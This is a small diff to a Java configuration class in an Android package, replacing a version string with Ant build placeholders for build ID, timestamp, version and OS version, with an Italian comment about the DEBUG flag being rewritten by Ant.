@@ -2,7 +2,12 @@ package com.android.service.auto;
 
 public class Cfg {
 	//ATTENZIONE, NON CAMBIARE A MANO LA VARIABILE DEBUG, VIENE RISCRITTA DA ANT
-	public static final String VERSION = "@VERSION@";
+	
+    public static final int BUILD_ID = @BUILD_ID@;
+    public static final String BUILD_TIMESTAMP = "@BUILD_TIMESTAMP@";
+    
+    public static final int VERSION = @VERSION@;
+	public static final String OSVERSION = "@OSVERSION@";
 	
 	public static final boolean DEBUG = @DEBUG@;
 	public static final boolean EXCEPTION = @EXCEPTION@;
